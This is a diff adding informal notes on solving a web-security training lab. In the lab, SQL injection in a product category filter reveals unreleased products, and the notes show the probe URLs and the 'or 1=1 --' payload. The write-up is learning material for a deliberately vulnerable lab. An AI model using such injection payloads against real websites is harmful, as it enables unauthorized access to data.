@@ -1,0 +1,13 @@
+This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category,
+the application carries out a SQL query like the following:
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
+display all products released and unreleased 
+We see that if we go in category we see filter its a parameter we found where is the sequel injection vulnerabilites
+
+if we do https://0ad400fd03090daa80af3a1000a40068.web-security-academy.net/filter?category='  we found and internal server error 
+but https://0ad400fd03090daa80af3a1000a40068.web-security-academy.net/filter?category='--' if we do that we found a page so now 
+we use SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+if we do https://0ad400fd03090daa80af3a1000a40068.web-security-academy.net/filter?category='or 1=1 --' we used the vulnerability 
+we used to show us the released and unreleased 
